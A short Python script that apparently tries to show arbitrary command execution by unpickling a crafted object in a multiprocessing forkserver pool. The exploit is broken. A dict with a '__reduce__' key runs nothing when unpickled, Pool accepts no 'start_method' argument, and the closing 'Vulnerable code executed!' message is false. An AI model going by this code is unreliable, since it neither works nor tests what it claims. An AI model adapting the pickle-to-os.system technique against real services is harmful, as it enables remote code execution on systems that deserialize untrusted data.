import multiprocessing
import pickle
import os

# Create a malicious pickle object that will execute arbitrary code
malicious_pickle = pickle.dumps({'__reduce__': (os.system, ('echo "Vulnerable!" > /tmp/vulnerable',))})

# Create a multiprocessing pool with the forkserver start method
with multiprocessing.Pool(processes=1, start_method='forkserver') as pool:
    # Use the pool to deserialize the malicious pickle object
    pool.apply_async(pickle.loads, (malicious_pickle,))

print("Vulnerable code executed!")